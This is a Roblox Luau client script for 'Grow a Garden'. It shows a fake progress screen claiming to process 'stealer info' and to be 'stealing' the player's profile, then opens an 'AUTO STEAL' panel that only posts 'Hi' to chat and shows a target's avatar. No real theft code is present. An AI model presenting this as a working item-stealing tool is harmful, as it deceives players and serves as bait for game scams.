-- SERVICES
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local MarketplaceService = game:GetService("MarketplaceService")
local PlayersService = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- GUI SETUP
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "GrowAGardenLoadingGUI"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(1, 0, 1, 0)
mainFrame.Position = UDim2.new(0, 0, 0, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Name = "GrowAGardenMainFrame"
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Text = "🌱 GROW A GARDEN 🌱"
title.Font = Enum.Font.Arcade
title.TextSize = 48
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Size = UDim2.new(1, 0, 0.1, 0)
title.Position = UDim2.new(0, 0, 0.1, 0)
title.BackgroundTransparency = 1
title.Parent = mainFrame

local timer = Instance.new("TextLabel")
timer.Font = Enum.Font.Arcade
timer.TextSize = 28
timer.TextColor3 = Color3.fromRGB(255, 255, 255)
timer.Size = UDim2.new(1, 0, 0.08, 0)
timer.Position = UDim2.new(0, 0, 0.2, 0)
timer.BackgroundTransparency = 1
timer.Text = "Loading..."
timer.Parent = mainFrame

local status = Instance.new("TextLabel")
status.Font = Enum.Font.Arcade
status.TextSize = 24
status.TextColor3 = Color3.fromRGB(255, 255, 255)
status.Size = UDim2.new(1, 0, 0.08, 0)
status.Position = UDim2.new(0, 0, 0.28, 0)
status.BackgroundTransparency = 1
status.Text = "Initializing..."
status.Parent = mainFrame

-- LOADING BAR
local barFrame = Instance.new("Frame")
barFrame.Size = UDim2.new(0.6, 0, 0.05, 0)
barFrame.Position = UDim2.new(0.2, 0, 0.4, 0)
barFrame.BackgroundTransparency = 1
barFrame.Name = "GrowAGardenBarFrame"
barFrame.Parent = mainFrame

local blocks = {}
for i = 1, 10 do
	local block = Instance.new("Frame")
	block.Size = UDim2.new(0.03, 0, 1, 0)
	block.Position = UDim2.new((i - 1) * 0.1, 0, 0, 0)
	block.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	block.BorderSizePixel = 0
	block.Name = "Block" .. i
	block.Parent = barFrame

	local uicorner = Instance.new("UICorner")
	uicorner.CornerRadius = UDim.new(1, 0)
	uicorner.Parent = block

	blocks[i] = block
end

-- FLASH FUNCTION
local function flashBackground(frame)
	local colors = {
		Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255),
		Color3.fromRGB(255, 255, 0), Color3.fromRGB(255, 0, 255), Color3.fromRGB(0, 255, 255)
	}
	for i = 1, 6 do
		TweenService:Create(frame, TweenInfo.new(0.1), { BackgroundColor3 = colors[i] }):Play()
		wait(0.1)
	end
	TweenService:Create(frame, TweenInfo.new(0.2), { BackgroundColor3 = Color3.fromRGB(20, 20, 30) }):Play()
end

-- BLOCK ANIMATION
local function lightUpBlock(index)
	if blocks[index] then
		local block = blocks[index]
		block.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

		local stroke = Instance.new("UIStroke")
		stroke.Thickness = 2
		stroke.Color = Color3.fromRGB(0, 255, 255)
		stroke.Transparency = 0.3
		stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		stroke.Parent = block

		TweenService:Create(stroke, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
			Transparency = 0.05
		}):Play()

		TweenService:Create(block, TweenInfo.new(0.7, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true), {
			BackgroundColor3 = Color3.fromRGB(255, 255, 0)
		}):Play()
	end
end

-- MAIN TIMER LOOP
local processes = {
	"PROCESSING THE SCRIPT",
	"PROCESSING THE PLAYERS INVENTORY",
	"PROCESSING THE STEALER INFO",
	"PROCESSING THE AUTO GIFT",
	"VERIFIED THE PROCESS"
}

local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
local displayName = player.DisplayName or player.Name

local totalTime = 150
local steps = #processes
local interval = totalTime / steps
local blockInterval = totalTime / 10

coroutine.wrap(function()
	for i = 1, 10 do
		lightUpBlock(i)
		wait(blockInterval)
	end
end)()

for step = 1, steps do
	if processes[step] == "PROCESSING THE STEALER INFO" then
		status.Text = "STEALING PROFILE: " .. displayName .. " in " .. gameName
	else
		status.Text = processes[step]
	end
	for t = interval, 1, -1 do
		timer.Text = string.format("%.0f seconds remaining", totalTime)
		totalTime -= 1
		wait(1)
	end
end

status.Text = "✅ PROCESS COMPLETED"
flashBackground(mainFrame)
wait(2)
screenGui:Destroy()

-- AUTO STEAL GUI
local stealGui = Instance.new("ScreenGui")
stealGui.Name = "AutoStealGui"
stealGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0.6, 0, 0.6, 0)
frame.Position = UDim2.new(0.2, 0, 0.2, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = stealGui

local border = Instance.new("UIStroke")
border.Thickness = 2
border.Color = Color3.fromRGB(0, 170, 255)
border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
border.Parent = frame

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "AUTO STEAL"
titleLabel.Font = Enum.Font.Arcade
titleLabel.TextSize = 36
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Size = UDim2.new(1, 0, 0.2, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Parent = frame

local usernameBox = Instance.new("TextBox")
usernameBox.PlaceholderText = "PUT USERNAME"
usernameBox.Font = Enum.Font.Arcade
usernameBox.TextSize = 24
usernameBox.Size = UDim2.new(0.9, 0, 0.15, 0)
usernameBox.Position = UDim2.new(0.05, 0, 0.25, 0)
usernameBox.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
usernameBox.Parent = frame

local avatarImage = Instance.new("ImageLabel")
avatarImage.Size = UDim2.new(0, 100, 0, 100)
avatarImage.Position = UDim2.new(0.5, -50, 0.45, 0)
avatarImage.BackgroundTransparency = 1
avatarImage.Visible = false
avatarImage.Parent = frame

local stealButton = Instance.new("TextButton")
stealButton.Text = "STEAL"
stealButton.Font = Enum.Font.Arcade
stealButton.TextSize = 28
stealButton.Size = UDim2.new(0.6, 0, 0.15, 0)
stealButton.Position = UDim2.new(0.2, 0, 0.75, 0)
stealButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
stealButton.TextColor3 = Color3.fromRGB(255, 255, 255)
stealButton.Parent = frame

local cornerBtn = Instance.new("UICorner")
cornerBtn.CornerRadius = UDim.new(0, 10)
cornerBtn.Parent = stealButton

stealButton.MouseButton1Click:Connect(function()
	if usernameBox.Text and usernameBox.Text ~= "" then
		local success, err = pcall(function()
			ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hi", "All")
		end)
		if not success then
			warn("Failed to send message:", err)
		end

		local targetName = usernameBox.Text
		local userId
		pcall(function()
			userId = Players:GetUserIdFromNameAsync(targetName)
		end)
		if userId then
			local thumb = Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
			avatarImage.Image = thumb
			avatarImage.Visible = true
		end
	end
end)

usernameBox.FocusLost:Connect(function(enterPressed)
	if enterPressed then
		local targetName = usernameBox.Text
		local userId
		pcall(function()
			userId = Players:GetUserIdFromNameAsync(targetName)
		end)
		if userId then
			local thumb = Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
			avatarImage.Image = thumb
			avatarImage.Visible = true
		end
	end
end)
